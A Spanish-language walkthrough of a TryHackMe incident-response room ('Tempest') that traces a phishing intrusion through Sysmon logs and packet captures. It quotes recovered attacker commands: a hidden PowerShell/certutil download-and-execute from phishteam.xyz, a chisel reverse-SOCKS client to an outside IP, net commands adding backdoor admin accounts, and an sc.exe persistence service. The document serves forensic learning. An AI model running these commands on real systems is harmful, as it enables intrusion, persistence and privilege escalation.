
https://tryhackme.com/room/tempestincident

Antes de nada, usé en el powershell del laboratorio este comando para poder usar el archivo en la app timeline explorer: `.\EvtxECmd.exe -f "C:\Users\user\Desktop\Incident Files\sysmon.evtx" --csv "C:\Users\user\Desktop\Incident Files" --csvf sysmon.csv` 
Usando la herramienta `EctxECmd.exe`
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260801094644.png)
La tarea (task) 1 es la presentación del reto y la 2 es el contexto y herramientas que tengo diponibles, este ctf se divide en varias secciones.
Por lo que lo menciono para que se temga en cuenta para q empiece por el punto 3
## 3.1. Cual es el hash SHA256 de capture.pcapng?
Para estas primeras 3 preguntas, en un sistema window que es en el cual se lleva a cabo el laboratorio, se puede usar simplemente la herramientas Get-FileHash sobre cada uno de los archivos.
Este primero usaré: `Get-FileHash -Algorithm SHA256 .\capture.pcapng`

![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260801094023.png)
Siendo el hash: `CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6`
## 3.2. Cual es el hash SHA256 de sysmon.evtx?
`Get-FileHash -Algorithm SHA256 .\sysmon.evtx`
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260801094059.png)
`665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F`
## 3.3. Cual es el hash SHA256 de windows.evtx?
`Get-FileHash -Algorithm SHA256 .\windows.evtx`
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260801094125.png)
`D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60`
## 4.1. El usuario de la máquina fue comprometido por un documento malicioso, cual es su nombre (del archivo)?
Se sabe que es un documento, por lo que mi primer pensamiento fue el de buscar un .doc, o archivos similares que sean documentos, como word, pdf, txt. Pero, frente a la aparente casi inmensidad de los archivos syslog, opté por esquematizarlo con el comando ya comentado:`.\EvtxECmd.exe -f "C:\Users\user\Desktop\Incident Files\sysmon.evtx" --csv "C:\Users\user\Desktop\Incident Files" --csvf sysmon.csv` Usando la herramienta `EctxECmd.exe` ya que así se me hace mas facil poder acceder/visualizar la información.
Cabe destacar que voy a usar la herramienta Timeline Explorer ya con el .csv.
En la columna de executable info, voy a buscar .doc para empezar
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260801095005.png)
Se puede ver como hay un documento .doc.
Cabe destacar que es una manera redundante, y, procedural mente, se pueden aplicar otros procesos, como por ejemplo, filtrar por event id, el 11 específicamente ya que dicho evento en windows puede indicar diferentes cosas respecto al registro, pero, en este caso es sysmon, el event id 11 indica la creación de archivos. A demás, en este caso, no está en executable info, está en una de las columnas de payload data
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260801095813.png)
## 4.2. Cual es el nombre de la máquina comprometida y del usuario?
Los nombres se pueden ver en en mismo archivo nuevo creado .csv en una columna especifica, por lo que partiendo del mismo filtro de la pregunta anterior, se puede ver C:\Users\Benimaru... , pero en la columna username se puede ver mejor:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260801100307.png)
Se ve como el usuario es benimaru y la máquina es Tempest
## 4.3. Cual es el PID del proceso de windows que abrió el documento malicioso?
Está preguntando por el PID de un proceso. El event id de creación de proceso es 1 , por lo que el filtro de la columna event id se debe de cambiar a 1. También he retorcedido a executable info para volver a buscar doc, y poder encontrar dicho pid mas especifico
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260801101101.png)
Aplicando los filtros de `[Event ID= 1] And [Executable info contains doc]`, se puede ver como queda 1 solo, en esa coincidencia, en la columna de payload data 1, se puede ver el ProcessID (PID) que es 496
## 4.4. En base a los logs de Sysmon, cual es la ip (IPv4) del dominio malicioso?
Esta pregunta me costó mas de la cuenta a mi parecer sin entender por qué, posiblemente por no entender lo que debia de buscar o como  buscarlo exactamente.
Para esta pregunta, el event id debe de ser 22 que es para dns query/ consultas dns. Aunque solo con el event id 22, no es suficiente para poder especificar el dominil, ya que hay varios. Ahora bien, en la anterior pregunta conseguí el PID 496, el cual es el que abrió el documento malicioso, por lo que se puede usar como "referencia" en payload data 1 
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260801102040.png)
En payload data 4 se ven varias url:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260801102132.png)
Pero sin IP, por lo que seguiré buscando:
En payload data 6, se ve como hay ip:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260801102214.png)
Que coinciden con a fila del dominio `phishteam.xyz` con la ip 167.71.199.191
## 4.5. Cual es el base64 del payload malicioso que se ejecutó por el documento?
Esta pregunta si que me costó también porque no entendía como buscar exactamente el base 64
Me está preguntando por un base64. Puedo probar con event id 1 ya que está ejecutando un comando, o sea, está con un proceso para ejecutar un comando aunque sea en base 64.
Tras investigar decubrí que se puede filtrar por el mismo PID en el payload data 5 y, en executable info, se puede ver
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260801103930.png)
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260801104001.png)
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260801104107.png)

## 5.1. La ejecución del payload creó un archivo en el sistema, cual es la ruta completa al mismo?
Me dice que busque la ruta completa del payload. Para ello, voy a empezar buscando por event id 11 ya que, en sysmon, indica la creación de un archivo, abriéndolo en timeline explorer.
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260802220828.png)
Se ve que hay varios, debo de pensar en alguna otra manera de filtrarlo.
Tal vez, por lo que se hasta ahora, principalmente en la 4.5, "startup" indica que se ejecute cuando se encienda el sistema y a demas se le añade que tiene el "contexto" de payload malicioso. Tal vez si uso eso para buscarlo ayude:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260802221914.png)
Se ve como si que está, aunque lo haya buscado por el atajo ctrl + f, filtré por event id 11 y username benimaru. Cabe destacar que la respuesta estaba ahí en ese grupo primero, por lo que posiblemente lo haya podido encontrar. Ahora bien, se ve que en la columna de payload data 4, se ve como está esto `C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.zip` Los payloads se pueden descargar por medio de .zip, por lo que eso llama la atención, y el crear un archivo para que se ejecute al encender el pc es poco común.
## 5.2. El payload se ejecuta una vez el usuario accede a la máquina, cual es el comando ejecutado de cara al login exitoso al usuario comprometido?
Ya que se ejecuta, es posible que se lleve a cabo una creación de proceso, event id 1 que puede ser un punto de partida
Para esta pregunta acabé necesitando ayuda externa. No había caído que puede usar un comando de una herramienta legitima de windows par descargarlo, en este caso, certutil, aunque en escenarios realistas se usan más. La filtré en la columna de executable files
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260802223631.png)
Los detalles de ambos eventos son: 
`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe`
Se que es ese, porque en payload data 4 es, de los 2 , el que usa powershell para ejecutar el comando.

## 5.3. En base a los logs de sysmon, cual es el SHA256 del binario malicioso descargado para la ejecución fase 2?
Ya se que para dicha fase se usó el archivo first.exe, lo puedo usar para informarme más sobre la fase 2. En este caso, lo voy a filtrar en payload data 4.
Ahora en payload data 3, se pueden ver datos de hashes, md4, sha256, o imphash
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260810221849.png)
En este caso, el hash sha256 es:
`1D5491E3C468EE4B4EF6EDFF4BBC7D06EE83180F6F0B1576763EA2EFE049493A`
## 5.4. El payload de fase 2 descargado estableció una conexión con un server C2, cual es el dominio y el puerto usado por el atacante?
Voy a empezar probando a filtrar por el event id 3 que en sysmon viene a ser el que se le atribuyen las conexiones.
Aunque se ve que hay muchos eventos:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260810222307.png)
Por lo que voy a probar otras maneras de buscarlo.
- Pregunta por el dominio + puerto
- El payload de fase 2 estableció la conexión con dicho dominio + puerto
Tras intentar razonar el proceso, he acabado recurriendo a la busqueda. 
Consiste en el PPID (Parent process id), siendo este 8948. Dichos eventos diría que se pueden ver en la columna de Payload data 1, por lo que lo voy a filtrar ahí:
Se puede ver una url:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260810223530.png)
`resolvecyber.xyz`
Aunque me falta el puerto. 
Puedo ver que la destination ip es: `167.71.222.162`
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260810223857.png)
Mirando en la columna de payload, se ve como el Destination port pone 80, por lo que es posible que sea la respuesta (por motivos de que os atacantes suelen usar vías desprotegidas en algunos entornos)
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260810223939.png)
Aunque, tal vez por wireshark con el .pcap se puede sacar más en claro:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260810224319.png)
Se ve como el puerto es 80, quedando: `resolvecyber.xyz:80`
## 6.1. Cual es la url que vino del codigo malicioso junto con el documento ya mencionado?
Cuando dice url, no se refiere a solo el dominio, sino la dirección completa. Por wireshark tal vez se pueda ver:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260810224912.png)
Se puede ver que, por medio del metodo get que es lo que he usado yo para localizarlo, se puede ver la uri /02dcf07/index.html
Quedando: `http://phishteam.xyz/02dcf07/index.html`
## 6.2. Cual es el método de codificación usado por el atacante en la conexión c2?
En wireshark buscando la url de `resolvecyber.xyz`, se puede ver la información del /los paquetes:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260810225638.png)
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260810225734.png)
Se puede ver como después del comando/indicador q, se puede ver una secuencia:
GET /9ab62b5?q=cHdkIC0gDQpQYXRoICAgICAgICAgICAgICAgDQotLS0tICAgICAgICAgICAgICAgDQpDOlxXaW5kb3dzXHN5c3RlbTMyDQoNCg0K HTTP/1.1\r\n
Parece estar codificado más que cifrado, por lo que lo voy a meter en cyberchef a ver que puedo sacar:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260810230018.png)
Gracias a cyberchef, se ve que es base64
## 6.3. El servidor C2 manda un payload usando un parametro que contiene el comando a ejecutar, cual es dicho parámetro?
El parámetro ya se vio antes, es `q` en los comandos de antes
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260810230128.png)
## 6.4. El c2 binario se conecta a una url específica para ejecutar el comando, cual es la url?
También se ve antes del comando:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260810230205.png)
`/9ab62b5`
## 6.5. Cual es el método usado por el binario?
El método, gracias a wireshark, es GET:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260810230325.png)
## 6.6. En base al user agent, que lenguaje de programación usó el atacante para compilar el binario.
Voy a probar a seguir el flujo TCP:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260810230521.png)
Para probar a obtener más datos de dicho/s paquetes:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260810230600.png)
Se ve que el user agent usa uno llamado Nim
`user-agent: Nim httpclient/1.6.6`
## 7.1. El atacante pudo descubrir un archivo sensible en la máquina del usuario, cual es la contraseña usada en dicho archivo?
Para esta "sección" (7.x) voy a probar, por consejo de la room, a usar brim con el .pcap y/o wireshark para poder analizar el tráfico.
Ya conociendo el dominio resolvecyber.xyz y el puerto 80 (http) voy a probar a filtrarlos en brim con este comando `_path=="http" "resolvecyber.xyz" id.resp_p==80 | cut ts, host, id.resp_p, uri | sort ts`
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260819154019.png)
Parece que son los mismos paquetes, evidentemente, que en wireshark. Sin embargo, es posible que encuentre también información relacionada con la contraseña presuntamente descubierta por el atacante de la misma manera que la solución de wireshark, es decir, decodificando, posiblemente con cyberchef
En el proceso de busqueda de decodificación, he encontrado algo raro:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260819154955.png)
Según esa consulta, parece ser que un tal "rimuru" es administrador del sistema, no benimaru, pueidendo estar relacionado con alguna pregunta que ya leí más adelante.
Tras un rato de buscar el paquete correcto, aparte de que estan codificados en base 64 como ya se mencionó, se ha encontrado:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260819155239.png)
Parecen ser consultas usando, por ejemplo $pass o $user, siendo la contraseña: `infernotempest`
## 7.2. El atacante listó una serie de puertos en la máquina, cual es al puerto que podría proveer un shell remoto dentro de la máquina?
Voy a probar esta vez a seguir decodificando como antes, a ver si encuentro el/los puertos y puedo probar a comprobar cual es el usado. No parece que encuentre nada en ninguno de los paquetes, a excepción de uno el cual no puedo copiar para plasmarlo en cyberchef, no entiendo la razón de eso.
Voy a probar en wireshark a ver si ahí logro encontrar algo más.
Habiendo buscado consejo, resulta que si que estaba, parcialmente en lo correcto, ya que justo el paquete que no puedo copiar todo su contenido es la solución, o al menos la contiene:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260819162414.png)
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260819162441.png)
Debido a que la maquina no me deja de ninguna manera copiar el contenido de base 64, he optado por recurrir a una guia que me suministre el contexto. De esta manera, estaba en lo correcto. 

Tras volver a la pregunta tras un tiempo, caí en la cuenta de que, posiblemente, estaba equivocado, aunque voy a dejar el proceso de mi error.

Me pregunta las conexiones, por lo que, buscando en internet, encontré que ejcutando este comando en powershell: `netstat -ano -p tcp -` me permite ver las conexiones llevadas a cabo: 
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260820101834.png)
Ahora bien, hay muchos puertos en local address. Voy a buscar que hace cada uno acorde a la pregunta para poder responderla.
Tras analizarlos, parece que el puerto `5985` es el que mas posibilidades tiene de ser el que buscaba ya que dicho puerto sirve para conexiones y administración de sistemas de manera remota, en HTTP:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260820102300.png)

## 7.3. El atacante estableció un reverse socks proxy para acceder a los servicios internos de la máquina de la victima, cual fue el comando ejecutado para establecer dicha conexión?
Para empezar, entre los paquetes codificados, encontré:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260820102745.png)
Parece ser que fue un comando de powershell que descargó una herramienta, ch.exe. Hay que decir que esto lo hice semi a ciegas por el hecho de que me pareció curioso el hecho de haberlo detectado (Como el usuario nuevo "rimuru")
Ese no es el comando (no es la respuesta al menos) asi que opté por buscarlo en timeline explorer:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260820102931.png)
Se ve como hay un comando en la columna de executable info que usa R:socks (Reverse socks), por lo que parece ser que el comando es: `C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks`
## 7.4. Cual es el SHA 256 del binario usado por el atacante para establecer la conexión reverse socks proxy?
En esa misma fila, en payload data 3:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260820103138.png)
Se puede ver el sha256 de dicho binario: `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`
## 7.5. Cual es el nombre de la herramienta usada por el atacante en base al sha256?
Con el sha256 ya obtenido, puedo, con virustotal, saber cual es el presunto nombre de la herramienta usada.
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260820153615.png)
Esa no es la respuesta, es muy probable que el malware se haya "actualizado" con el paso del tiempo recibiendo otras características. Voy a buscar nombres anteriores del programa:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260820153803.png)
Se ve como está el programa ch.exe, y que también se ha llamado la respuesta, `chisel`
`chisel`
## 7.6. El atacante usó las credenciales obtenidas de la máquina. En base al éxito de la ejecución del socks proxy, que servicio usó el atacante para autenticarse?
Sé que antes descubrí el puerto usado por el atacante. En dicha búsqueda hallé que dicho puerto servía para administrar de manera remota sistemas windows usando el protocolo `WinRM`
## 8.1. Tras descubrir los privilegios del usuario, el atacante descargó otro binario para usarse para la escalada de privilegios, cual es el nombre y el sha256 de dicho ejecutable?
Ya que el atacante descargó otro binario, voy a suponer que lo hizo por medio de alguno de los enlaces resolvecyber.xyz o phishteam.xyz
Parece que no encuentro más info en resolvecyber, por lo que voy a buscar phishteam.
Con phishteam he encontrado algo curioso, una correlación con sucesos anteriores, en este caso, la descarga/uso de ch.exe
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260820160343.png)
Ordenador ya por orden, parece que:
1. Descarga first.exe
2. Este descarga o descarga después, ch.exe (Usando powershell)
3. Después, desde la página `phishteam.xyz/02dcf07/spf.exe` parece descargar el nuevo archivo `spf.exe`
Es decir, se ve como descargó de phishteam:
- fisrt.exe
- ch.exe
- spf.exe
- final.exe
Descargándolos directamente de las rutas de la propia pagina web con los mismos nombres.
Voy a probar a buscar directamente spf.exe a ver si encuentro el hash del mismo.
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260821121217.png)
Se ve, en la imagen completa que usó spf.exe para hacer algo más con final.exe.
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260821122113.png)
En esa misma fila, en la columna de payload data 3, se pueden ver los hash:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260821122202.png)
No es la de abajo (la 4 fila) porque esa fila se refiere más, en executable info a final.exe, siendo el parent command line el de `"c:/users/downloads/spf.exe" -c C:/users/downloads/final.exe`
La respuesta finla sería: `spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`
## 8.2. En base al sha256, cual es el nombre de la herramienta usada?
Usando el hash previamente localizado: `8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`, lo voy a meter en virustotal para buscar dicha información sobre él:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260821122511.png)
Se puede ver el nombre de `printspoofer`
## 8.3. La herramienta explota un privilegio especifico del usuario, cual es el nombre del privilegio?
Para esta pregunta simplemente voy a buscar en internet el funcionamiento de la herramienta.
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260821123123.png)
`SeImpersonatePrivilege`
## 8.4. El atacante ejecutó después la herramienta con otro binario para establecer la conexión C2, cual es el nombre del binario?
Esto ya se vio antes, con la "llamada" de spf.exe a la descarga de final.exe (y su posible ejecución).
`final.exe`
## 8.5. El binario se conecta a otro puerto que la primera conexión C2, cual?
El binario nuevo es final.exe. Ese mismo binario parece que lleva a cabo diversas conexiones:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260821123949.png)
Parece que hace varias conexiones a `167.71.222.162`
Seleccionando la primera fila de la conexión, la 5 empezando desde arriba, y yéndome a la columna payload para ver todos los datos en un solo "archivo" o una sola "ventana"
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260821124729.png)
Se ve como para esa ip de destino, el destination port es `8080`
## 9.1. Para lograr acceso al sistema, el atacante creó 2 usuarios, cuales?
He encontrado que, en sysmon, la creación de usuarios se le puede atribuir al event id 1 en sysmon, por lo que voy a empezar buscando por ahí.
Tras investigar executable info en busca de algo relacionado con creación de usuarios, como add o algo similar he encontrado esto:
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260821130106.png)
Se ve como se crean 2 usuarios: `shion` y `shuna`
Se ve como usó net.exe
## 9.2. Ya sabiendo que ha logrado crear 2 cuentas, el atacante ejecutó comandos que fallaron intentos anteriores, cual es el comando que le faltaba?
En base a net.exe, voy a filtrar lso resultados para ver más claramente los comandos y detectar el posible error
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260821130642.png)
Se ve como intentó ejecutar el comando "user  shuna princess" sin el  `/add`
## 9.3. En base a los logs de eventos de windows, las cuentas se crearon. ¿Cual es el event id que indica el hecho de crear cuentas?
Para esta pregunta puedo recurrir simplemente a buscar en internet.
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260821131100.png)
`4720`
## 9.4. El atacante añadió una de las cuentas al grupo local de administradores, cual es el comando que usó?
En este caso, se vio parcialmente antes.
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260821204821.png)
Se ve como para el grupo de administradores, añade al recién creado shion a dicho grupo con el comando `localgroup administrators /add shion`. Sin embargo, esa respuesta no es del todo correcta. Ya que, segun he encontrado buscando, localgroup no es un comando independiente, forma parte de net, es decir, que es un subcomando de net, por lo que la respuesta sería: `net localgroup administrators /add shion`
Ese net al principio se puede explicar su ausencia por el net.exe, que parece ejecutar dicho comando de primera mano sin necesidad de ponerlo.
## 9.5. En base a los logs de eventos de windows, la cuenta se añadió correctamente a un grupo sensible, cual es el event id que indicca la adición de cuentas a grupos?
Para esta pregunta, también busqué en internet.
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260821205535.png)
Siendo la respuesta `4732` por el hecho de que es un grupo "local" del dispositivo
## 9.6. Tras la creación de la cuenta, el atacante ejecutó una técnica para establecer persistencia en el sistema y con acceso administrativo, cual es el comando ejecutado por el atacante para lograr esto?
Siguiendo el aparente orden de los archivos, por orden, parece que final.exe es el final del ataque. Por lo que lo voy a buscar a ver si encuentro algo relacionado con ese archivo, alguna linea de comando.
![img_captura_de_pantalla](Tempest_img/Pasted%20image%2020260822121617.png)
El hecho de que quiera ejecutar final.exe de manera automática al iniciar el sistema puede ser una técnica de persistencia "simple" usada por los atacantes. Siendo la respuesta: `C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto`

